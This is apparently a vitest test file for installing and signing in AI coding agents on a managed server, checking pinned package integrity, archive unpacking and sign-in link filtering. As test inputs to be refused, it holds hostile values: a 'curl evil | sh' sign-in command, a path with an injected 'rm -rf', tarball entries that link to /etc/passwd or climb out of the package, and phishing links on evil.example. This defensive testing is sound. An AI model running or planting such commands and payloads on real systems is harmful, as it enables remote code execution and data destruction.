/**
 * Installing and signing in agents on a managed server from the client (#1236). The "server" is
 * a temporary home on this machine: every remote command runs here, in that home, exactly as ssh
 * would run its words, so `tools/deploy/orca-host-agents.py` really unpacks, reports and runs
 * the agent's sign-in. The agent is a stand-in script at the pinned agent's path.
 */
import { spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmodSync,
  copyFileSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import { HOST_AGENT_LOCK, type HostAgentPackage } from "../src/host-agents-lock.js";
import type { RemoteCommand, RemoteCommandExit } from "../src/remote-access.js";
import {
  HOST_AGENTS,
  HOST_AGENTS_LOCK_FILE,
  hostAgentEntry,
  hostAgentSettings,
  hostAgentSignInCommand,
  hostAgentsProgram,
  hostAgentStatus,
  HostAgentRefused,
  installHostAgent,
  loginPrompt,
  prepareHostAgent,
  signInHostAgent,
  type HostAgentStream,
  type HostAgentTransport,
} from "../src/server-agents.js";

const scripts = fileURLToPath(new URL("../../../tools/deploy/", import.meta.url));
const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});
const tmp = () => {
  const dir = mkdtempSync(join(tmpdir(), "orca-agents-test-"));
  dirs.push(dir);
  return dir;
};

const COPILOT = "node_modules/@github/copilot-linux-x64";
/** A stand-in Copilot: `login --device-code` prints GitHub's prompt and signs the profile in. */
const FAKE_COPILOT = `#!/bin/sh
if [ "$1" = login ]; then
  printf '\\033[1m! First copy your one-time code: \\033[0mABCD-1234\\n'
  echo "Then open https://evil.example/login/device or https://github.com/login/device in your browser."
  printf '{"loggedInUsers":[{"host":"https://github.com","login":"someone"}]}' > "$COPILOT_HOME/config.json"
  echo "Signed in."
  exit 0
fi
exit 3
`;

/**
 * An npm-style tarball: each member a path (normally under `package/`) with its text, or `null`
 * for a link to /etc/passwd. Made with Python's tarfile so any member name can be written.
 */
function tarball(members: [string, string | null][]): { path: string; integrity: string } {
  const path = join(tmp(), "package.tgz");
  const made = spawnSync(
    "python3",
    [
      "-c",
      `import io, json, sys, tarfile
with tarfile.open(sys.argv[1], "w:gz") as archive:
    for name, text in json.loads(sys.argv[2]):
        info = tarfile.TarInfo(name)
        if text is None:
            info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
            archive.addfile(info)
            continue
        data = text.encode()
        info.size, info.mode = len(data), 0o755
        archive.addfile(info, io.BytesIO(data))`,
      path,
      JSON.stringify(members),
    ],
    { encoding: "utf8" },
  );
  expect(made.stderr).toBe("");
  return { path, integrity: `sha512-${createHash("sha512").update(readFileSync(path)).digest("base64")}` };
}

/**
 * A stand-in Copilot as the pinned packages, the lock that pins exactly them, the program with
 * that lock embedded, and a fetch that counts its calls.
 */
function copilotPackages(
  members: [string, string | null][] = [
    ["package/copilot", FAKE_COPILOT],
    ["package/package.json", "{}"],
  ],
  options: { entryLimit?: number } = {},
) {
  const made = tarball(members);
  const packages: HostAgentPackage[] = [
    { path: COPILOT, version: "1.0.114", tarball: "https://registry.example/copilot.tgz", integrity: made.integrity },
  ];
  const lock = JSON.stringify({
    schema: "orca-host-agents-lock/1",
    platform: "linux-x64",
    agents: { copilot: { version: "1.0.114", packages } },
  });
  const fetched: string[] = [];
  const fetch = (url: string) => {
    fetched.push(url);
    return Promise.resolve(readFileSync(made.path));
  };
  return { packages, fetch, fetched, program: hostAgentsProgram(scripts, { lock, ...options }) };
}

/** A server whose home is a temporary directory, with ORCA set up there (its root exists). */
function server(options: { setUp?: boolean } = {}) {
  const home = tmp();
  const root = join(home, ".local/share/orca-server");
  if (options.setUp !== false) mkdirSync(root, { recursive: true });
  const env = { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: home, LANG: "C.UTF-8" };
  const commands: string[][] = [];
  const transport: HostAgentTransport = {
    exec: (command, _timeout, input) => {
      commands.push([...command]);
      const result = spawnSync(command[0]!, command.slice(1), { cwd: home, env, encoding: "utf8", input });
      return Promise.resolve({ code: result.status ?? 255, stdout: result.stdout ?? "" });
    },
    upload: (path, remotePath) => {
      copyFileSync(path, remotePath.startsWith("/") ? remotePath : join(home, remotePath));
      return Promise.resolve();
    },
  };
  const stream: HostAgentStream = (command, onLine, input) => {
    commands.push([...command]);
    const child = spawn(command[0]!, command.slice(1), { cwd: home, env, stdio: ["pipe", "pipe", "pipe"] });
    child.stdin.end(input);
    const exit = new Promise<RemoteCommandExit>((resolve) => {
      let out = "";
      child.stdout.on("data", (chunk: Buffer) => (out += chunk.toString()));
      child.stderr.on("data", (chunk: Buffer) => (out += chunk.toString()));
      child.once("close", (code, signal) => {
        for (const line of out.split("\n")) if (line) onLine("stdout", line);
        resolve(code === null ? { kind: "signalled", signal: signal ?? "unknown" } : { kind: "exited", code });
      });
    });
    return { exit, kill: () => child.kill() } satisfies RemoteCommand;
  };
  return { home, root, transport, stream, commands };
}

async function install(host: ReturnType<typeof server>, made = copilotPackages(), cacheDir = tmp()) {
  const prepared = await prepareHostAgent("copilot", { fetch: made.fetch, cacheDir, packages: made.packages });
  try {
    return await installHostAgent(host.transport, prepared, made.program);
  } finally {
    rmSync(prepared.dir, { recursive: true, force: true });
  }
}

describe("Claude Code on the server: the person signs it in", () => {
  const CLAUDE = "node_modules/@anthropic-ai/claude-agent-sdk-linux-x64";
  /** A stand-in Claude Code that would sign itself in if ever run: it must not be. */
  const FAKE_CLAUDE = `#!/bin/sh\ntouch "$CLAUDE_CONFIG_DIR/ran"\nexit 0\n`;

  function claudePackages() {
    const made = tarball([
      ["package/claude", FAKE_CLAUDE],
      ["package/package.json", "{}"],
    ]);
    const packages: HostAgentPackage[] = [
      { path: CLAUDE, version: "0.3.330", tarball: "https://registry.example/claude.tgz", integrity: made.integrity },
    ];
    const lock = JSON.stringify({
      schema: "orca-host-agents-lock/1",
      platform: "linux-x64",
      agents: { claude: { version: "0.109.1", packages } },
    });
    return {
      packages,
      fetch: () => Promise.resolve(readFileSync(made.path)),
      program: hostAgentsProgram(scripts, { lock }),
    };
  }

  it("installs it, names the command to sign in there, and never runs or reads its sign-in", async () => {
    const host = server();
    const made = claudePackages();
    const prepared = await prepareHostAgent("claude", { fetch: made.fetch, cacheDir: tmp(), packages: made.packages });
    let installed;
    try {
      installed = await installHostAgent(host.transport, prepared, made.program);
    } finally {
      rmSync(prepared.dir, { recursive: true, force: true });
    }
    expect(installed).toMatchObject({
      agent: "claude",
      version: "0.109.1",
      home: `${host.root}/agents/claude/home`,
      binary: `${host.root}/agents/claude/0.109.1/files/${CLAUDE}/claude`,
    });
    const command = `CLAUDE_CONFIG_DIR=${installed.home} ${installed.binary} auth login`;
    expect(hostAgentSignInCommand(installed)).toBe(command);
    const settings = hostAgentSettings(installed);
    expect(hostAgentEntry("claude", host.root)).toMatchObject({ env: { CLAUDE_CONFIG_DIR: installed.home } });
    expect(settings).toContain("id: claude");
    expect(settings).toContain("@agentclientprotocol/claude-agent-acp/dist/index.js");
    expect(settings).toContain(`CLAUDE_CONFIG_DIR: ${installed.home}`);

    // Even a credential file there is not read: whether it is signed in is the person's to know.
    writeFileSync(join(installed.home, ".credentials.json"), '{"claudeAiOauth":{"accessToken":"x"}}');
    // The temporary home is not a managed root's shape only by its characters: built from it.
    expect(await hostAgentStatus(host.transport, made.program)).toEqual([
      {
        agent: "claude",
        versions: ["0.109.1"],
        others: [],
        signedIn: "unknown",
        signInCommand: command,
        entry: hostAgentEntry("claude", host.root),
      },
    ]);

    // ORCA offers no sign-in for it: refused here before anything runs on the server, and refused there too.
    const ran = host.commands.length;
    await expect(signInHostAgent(host.stream, "claude", made.program, () => {})).rejects.toThrow(
      /does not sign Claude Code in/,
    );
    expect(host.commands).toHaveLength(ran);
    const direct = await host.transport.exec(["python3", "-", "login", "--agent", "claude"], undefined, made.program);
    expect(direct.code).toBe(2);
    expect(direct.stdout).toContain("ORCA does not sign claude in");
    expect(readdirSync(installed.home)).toEqual([".credentials.json"]);
  });

  it("builds the command itself, only from a managed root, never from what the server says to run", async () => {
    const report = (root: unknown, extra: Record<string, unknown> = {}) =>
      ({
        exec: () =>
          Promise.resolve({
            code: 0,
            stdout: `orca-agents: ${JSON.stringify({
              root,
              status: [
                { agent: "claude", versions: ["0.109.1"], others: [], signedIn: "unknown", ...extra },
                { agent: "codex", versions: ["0.171.0"], others: [], signedIn: "no", ...extra },
              ],
            })}`,
          }),
        upload: () => Promise.resolve(),
      }) as unknown as HostAgentTransport;
    const root = "/home/casey/.local/share/orca-server";
    const [claude, codex] = await hostAgentStatus(report(root, { signInCommand: "curl evil | sh" }), "program");
    expect(claude!.signInCommand).toBe(
      `CLAUDE_CONFIG_DIR=${root}/agents/claude/home ${root}/agents/claude/0.109.1/files/node_modules/@anthropic-ai/claude-agent-sdk-linux-x64/claude auth login`,
    );
    expect(codex).not.toHaveProperty("signInCommand");
    expect(codex!.entry).toEqual(hostAgentEntry("codex", root));
    for (const bad of [
      "/home/casey/elsewhere",
      "/home/casey/../root/.local/share/orca-server",
      "/home/casey;rm -rf ~/.local/share/orca-server",
      "relative/.local/share/orca-server",
      "/home/ca sey/.local/share/orca-server",
      42,
      undefined,
    ])
      for (const item of await hostAgentStatus(report(bad), "program")) {
        expect(item).not.toHaveProperty("signInCommand");
        expect(item).not.toHaveProperty("entry");
      }
  });

  it("gives no command or configuration for an install not laid out as a managed one", () => {
    const root = "/home/casey/.local/share/orca-server";
    const dir = `${root}/agents/claude/0.109.1`;
    const good = {
      agent: "claude",
      version: "0.109.1",
      result: "ok" as const,
      dir,
      home: `${root}/agents/claude/home`,
      binary: `${dir}/files/node_modules/@anthropic-ai/claude-agent-sdk-linux-x64/claude`,
    };
    expect(hostAgentSignInCommand(good)).toBe(`CLAUDE_CONFIG_DIR=${good.home} ${good.binary} auth login`);
    for (const changed of [
      { home: "/tmp/home" },
      { binary: "/usr/bin/evil" },
      { version: "0.109.2", dir: `${root}/agents/claude/0.109.2` },
      { dir: "/opt/agents/claude/0.109.1", home: "/opt/agents/claude/home" },
    ]) {
      expect(hostAgentSignInCommand({ ...good, ...changed })).toBeUndefined();
      expect(() => hostAgentSettings({ ...good, ...changed })).toThrow(/not laid out as a managed install/);
    }
    expect(hostAgentSettings(good)).toContain(`CLAUDE_CONFIG_DIR: ${good.home}`);
    expect(hostAgentSignInCommand({ ...good, agent: "codex" })).toBeUndefined();
    // Not under a managed root, or a root with a traversal in it: no settings, no entry.
    const outside = "/home/casey/../../tmp/.local/share/orca-server";
    expect(() =>
      hostAgentSettings({
        ...good,
        dir: `${outside}/agents/claude/0.109.1`,
        home: `${outside}/agents/claude/home`,
        binary: `${outside}/agents/claude/0.109.1/files/node_modules/@anthropic-ai/claude-agent-sdk-linux-x64/claude`,
      }),
    ).toThrow(/not laid out as a managed install/);
    expect(() => hostAgentEntry("codex", outside)).toThrow(/not a managed server root/);
    expect(() => hostAgentEntry("codex", "/opt/orca")).toThrow(/not a managed server root/);
  });
});

describe("installing an agent on the server", () => {
  it("unpacks the pinned packages under the server root, once, and says how to run the agent", async () => {
    const host = server();
    const made = copilotPackages();
    const cache = tmp();
    const first = await install(host, made, cache);
    expect(first).toMatchObject({
      agent: "copilot",
      version: "1.0.114",
      result: "changed",
      dir: `${host.root}/agents/copilot/1.0.114`,
      home: `${host.root}/agents/copilot/home`,
      binary: `${host.root}/agents/copilot/1.0.114/files/${COPILOT}/copilot`,
    });
    expect(readFileSync(first.binary, "utf8")).toBe(FAKE_COPILOT);
    expect(lstatSync(first.home).mode & 0o777).toBe(0o700);
    // The courier directory is gone, and nothing was read by a shell.
    expect(readdirSync(join(host.home, ".cache/orca-courier"))).toEqual([]);
    expect(host.commands.some((command) => ["sh", "bash", "-c"].includes(command[0]!))).toBe(false);

    // Again: from this computer's cache, and the same install is accepted as it is.
    const again = await install(host, made, cache);
    expect(again.result).toBe("ok");
    expect(made.fetched).toHaveLength(1);

    const settings = hostAgentSettings(first);
    // The entry the app adds to the server's config is what the printed settings say.
    expect(hostAgentEntry("copilot", host.root)).toMatchObject({
      command: first.binary,
      env: { COPILOT_HOME: first.home },
    });
    expect(settings).toContain(`command: ${first.binary}`);
    expect(settings).toContain(`COPILOT_HOME: ${first.home}`);
  });

  it("installs only exactly what the shipped lock pins, whatever the carried list says", async () => {
    const host = server();
    const pinned = copilotPackages();
    const other = copilotPackages([
      ["package/copilot", FAKE_COPILOT.replace("Signed in.", "Other build.")],
      ["package/package.json", "{}"],
    ]);
    // Carried and self-consistent, but not the lock's integrity: refused before anything is unpacked.
    const prepared = await prepareHostAgent("copilot", {
      fetch: other.fetch,
      cacheDir: tmp(),
      packages: other.packages,
    });
    try {
      await expect(installHostAgent(host.transport, prepared, pinned.program)).rejects.toThrow(
        /not exactly the packages this ORCA pins/,
      );
    } finally {
      rmSync(prepared.dir, { recursive: true, force: true });
    }
    expect(existsSync(`${host.root}/agents/copilot/1.0.114`)).toBe(false);
  });

  it("refuses a different install already at that version, and changes nothing", async () => {
    const host = server();
    await install(host);
    const other = copilotPackages([
      ["package/copilot", FAKE_COPILOT.replace("Signed in.", "Other build.")],
      ["package/package.json", "{}"],
    ]);
    await expect(install(host, other)).rejects.toThrow(/another install of copilot 1\.0\.114/);
    expect(readFileSync(`${host.root}/agents/copilot/1.0.114/files/${COPILOT}/copilot`, "utf8")).toBe(FAKE_COPILOT);
  });

  it("never runs, reports or reuses an install that changed since it was installed", async () => {
    const host = server();
    const made = copilotPackages();
    const first = await install(host, made);
    writeFileSync(first.binary, "#!/bin/sh\necho swapped\n", { mode: 0o755 });
    const [copilot] = await hostAgentStatus(host.transport, made.program);
    expect(copilot).toMatchObject({ agent: "copilot", versions: [], problem: expect.stringMatching(/has changed/) });
    await expect(signInHostAgent(host.stream, "copilot", made.program, () => {})).rejects.toThrow(/has changed/);
    await expect(install(host, made)).rejects.toThrow(/another install of copilot 1\.0\.114/);
    expect(readFileSync(first.binary, "utf8")).toContain("swapped");
  });

  it("never carries a package that does not match its pinned integrity", async () => {
    const made = copilotPackages();
    const tampered = { ...made, fetch: () => Promise.resolve(Buffer.from("not the package")) };
    await expect(
      prepareHostAgent("copilot", { fetch: tampered.fetch, cacheDir: tmp(), packages: made.packages }),
    ).rejects.toBeInstanceOf(HostAgentRefused);
  });

  it.each([
    ["a link", [["package/passwd", null]], /link or special file/],
    ["a path with a dot component", [["package/lib/./x.js", "x"]], /not plain/],
    ["a path that climbs out", [["package/../escape.js", "x"]], /not plain/],
    ["an absolute path", [["/etc/cron.d/x", "x"]], /not one package directory|not plain/],
    [
      "the same path twice",
      [
        ["package/x.js", "1"],
        ["package/x.js", "2"],
      ],
      /twice/,
    ],
    ["a second top directory", [["other/x.js", "x"]], /not one package directory/],
  ] as const)("refuses a package holding %s, and leaves no install behind", async (_, extra, error) => {
    const host = server();
    const made = copilotPackages([["package/copilot", FAKE_COPILOT], ...extra] as [string, string | null][]);
    await expect(install(host, made)).rejects.toThrow(error);
    expect(
      readdirSync(`${host.root}/agents/copilot`).filter((name) => name !== "home" && name !== ".install.lock"),
    ).toEqual([]);
  });

  it("refuses a package with more entries than the limit, before unpacking any", async () => {
    const host = server();
    const made = copilotPackages(
      [
        ["package/copilot", FAKE_COPILOT],
        ...Array.from({ length: 5 }, (_, i): [string, string] => [`package/f${i}`, ""]),
      ],
      { entryLimit: 4 },
    );
    await expect(install(host, made)).rejects.toThrow(/more than 4 entries/);
    expect(
      readdirSync(`${host.root}/agents/copilot`).filter((name) => name !== "home" && name !== ".install.lock"),
    ).toEqual([]);
  });

  it("never overlaps installs of one agent, and leaves a directory it did not make alone", async () => {
    const host = server();
    const made = copilotPackages();
    mkdirSync(`${host.root}/agents/copilot/.staging-interrupted/files`, { recursive: true, mode: 0o755 });
    writeFileSync(`${host.root}/agents/copilot/.staging-interrupted/files/keep`, "not ORCA's to remove");
    // Another install holds the lock: this one is refused and changes nothing.
    const holder = spawn("python3", [
      "-c",
      "import fcntl, os, sys, time\nfd = os.open(sys.argv[1], os.O_RDWR | os.O_CREAT, 0o600)\nfcntl.flock(fd, fcntl.LOCK_EX)\nprint('held', flush=True)\ntime.sleep(60)",
      `${host.root}/agents/copilot/.install.lock`,
    ]);
    await new Promise((resolve) => holder.stdout.once("data", resolve));
    try {
      await expect(install(host, made)).rejects.toThrow(/Another install of copilot is running/);
      expect(existsSync(`${host.root}/agents/copilot/1.0.114`)).toBe(false);
    } finally {
      holder.kill();
      await new Promise((resolve) => holder.once("close", resolve));
    }
    expect((await install(host, made)).result).toBe("changed");
    expect(readdirSync(`${host.root}/agents/copilot`).sort()).toEqual([
      ".install.lock",
      ".staging-interrupted",
      "1.0.114",
      "home",
    ]);
    expect(readFileSync(`${host.root}/agents/copilot/.staging-interrupted/files/keep`, "utf8")).toBe(
      "not ORCA's to remove",
    );
    expect(readdirSync(`${host.root}/agents/copilot/1.0.114`).sort()).toEqual(["files", "install.json"]);
  });

  it.each([
    ["the server root", ".local/share/orca-server"],
    ["a directory above it", ".local/share"],
  ])("refuses when %s can be changed by other accounts", async (_, relative) => {
    const host = server();
    chmodSync(join(host.home, relative), 0o777);
    try {
      await expect(install(host)).rejects.toThrow(/can be changed by other accounts/);
      expect(existsSync(`${host.root}/agents`)).toBe(false);
    } finally {
      chmodSync(join(host.home, relative), 0o755);
    }
  });

  it("refuses a machine that is not set up yet", async () => {
    await expect(install(server({ setUp: false }))).rejects.toThrow(/not an ORCA server yet/);
  });

  it("refuses an agents directory that is a link", async () => {
    const host = server();
    const elsewhere = tmp();
    symlinkSync(elsewhere, join(host.root, "agents"));
    await expect(install(host)).rejects.toThrow(/not a directory of the ORCA server's own/);
    expect(readdirSync(elsewhere)).toEqual([]);
  });

  it("keeps the shipped lock and the client's lock the same", () => {
    const shipped = JSON.parse(readFileSync(join(scripts, HOST_AGENTS_LOCK_FILE), "utf8")) as {
      agents: Record<string, unknown>;
    };
    expect(shipped).toMatchObject({ schema: "orca-host-agents-lock/1", platform: "linux-x64" });
    expect(shipped.agents).toEqual(HOST_AGENT_LOCK);
  });
});

describe("signing an agent in on the server", () => {
  it("relays only a link on the agent's own sign-in page and the code, then reports it signed in", async () => {
    const host = server();
    const made = copilotPackages();
    expect(await hostAgentStatus(host.transport, made.program)).toEqual([
      { agent: "copilot", versions: [], others: [], signedIn: "no" },
    ]);
    await install(host, made);
    expect((await hostAgentStatus(host.transport, made.program))[0]).toEqual({
      agent: "copilot",
      versions: ["1.0.114"],
      others: [],
      signedIn: "no",
      entry: hostAgentEntry("copilot", host.root),
    });
    const prompts: unknown[] = [];
    await signInHostAgent(host.stream, "copilot", made.program, (prompt) => prompts.push(prompt));
    expect(prompts.at(-1)).toEqual({ url: "https://github.com/login/device", code: "ABCD-1234" });
    expect(JSON.stringify(prompts)).not.toContain("evil.example");
    expect((await hostAgentStatus(host.transport, made.program))[0]!.signedIn).toBe("yes");
  });

  it("refuses to sign in on a profile open to other accounts", async () => {
    const host = server();
    const made = copilotPackages();
    const installed = await install(host, made);
    chmodSync(installed.home, 0o755);
    await expect(signInHostAgent(host.stream, "copilot", made.program, () => {})).rejects.toThrow(
      /open to other accounts/,
    );
  });

  it("ends the sign-in on the server when it is cancelled, and starts none once cancelled", async () => {
    let kills = 0;
    let finish: (exit: RemoteCommandExit) => void = () => {};
    let started = 0;
    const stream = (_command: readonly string[], onLine: (stream: "stdout" | "stderr", line: string) => void) => {
      started += 1;
      queueMicrotask(() => {
        onLine("stdout", 'orca-agents: {"step":"login","result":"started"}');
        onLine("stdout", "Open https://github.com/login/device and enter ABCD-1234");
      });
      return {
        exit: new Promise<RemoteCommandExit>((resolve) => (finish = resolve)),
        kill: () => {
          kills += 1;
          finish({ kind: "signalled", signal: "SIGTERM" });
        },
      } satisfies RemoteCommand;
    };
    const controller = new AbortController();
    const prompts: unknown[] = [];
    const running = signInHostAgent(
      stream,
      "copilot",
      "program",
      (prompt) => {
        prompts.push(prompt);
        controller.abort();
      },
      undefined,
      controller.signal,
    );
    await expect(running).rejects.toThrow(/sign-in was cancelled/);
    expect(prompts).toHaveLength(1);
    expect(kills).toBe(1);
    await expect(signInHostAgent(stream, "copilot", "program", () => {}, undefined, controller.signal)).rejects.toThrow(
      /cancelled/,
    );
    expect(started).toBe(1);
  });

  it("refuses to sign in an agent that is not installed", async () => {
    const host = server();
    const { program } = copilotPackages();
    await expect(signInHostAgent(host.stream, "copilot", program, () => {})).rejects.toThrow(/not installed/);
    await expect(signInHostAgent(host.stream, "nope", program, () => {})).rejects.toThrow(/No agent called nope/);
  });

  it("takes links only from the agent's origins, without credentials", () => {
    const origins = HOST_AGENTS.codex!.loginOrigins;
    expect(loginPrompt("Open https://auth.openai.com/codex/device and enter WXYZ-12345.", origins)).toEqual({
      url: "https://auth.openai.com/codex/device",
      code: "WXYZ-12345",
    });
    expect(loginPrompt("https://user:pw@auth.openai.com/x", origins)).toEqual({});
    expect(loginPrompt("http://auth.openai.com/codex/device", origins)).toEqual({});
    expect(loginPrompt("https://auth.openai.com.evil.example/codex/device", origins)).toEqual({});
  });
});
